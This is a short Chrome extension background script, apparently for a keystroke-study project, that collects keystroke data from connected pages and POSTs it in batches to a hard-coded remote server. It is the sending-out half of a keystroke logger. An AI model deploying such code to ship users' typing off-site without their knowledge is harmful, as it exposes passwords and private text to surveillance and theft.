// A dumb package that will relay messages from webpage to remote storage
(function() {

  var DATA_URL = 'http://yuze.stanford.edu:8081';
  var MAX_TEMP = 5;
  var isSending = false;

  var tempStorage = [];
 
  var sendDataToServer = function() {
    isSending = true;
    var dataString = JSON.stringify(tempStorage);
    $.post(DATA_URL, dataString);
    console.log(dataString);
    tempStorage = [];
    isSending = false;
  };

  // Receives data, sends it off to a server for storage.
  var receiveData = function(msg) {
    if (isSending) {
      setTimeout(function(){receiveData(msg);}, 500);
    } else {
      var keystrokes = msg.keystrokes;
      tempStorage.push.apply(tempStorage, keystrokes);
      if (tempStorage.length > MAX_TEMP) {
        sendDataToServer();
      }
    }
  };

  chrome.extension.onConnect.addListener(function(port) {
    console.assert(port.name == "kss_data");
    port.onMessage.addListener(receiveData);
  });
  
})();
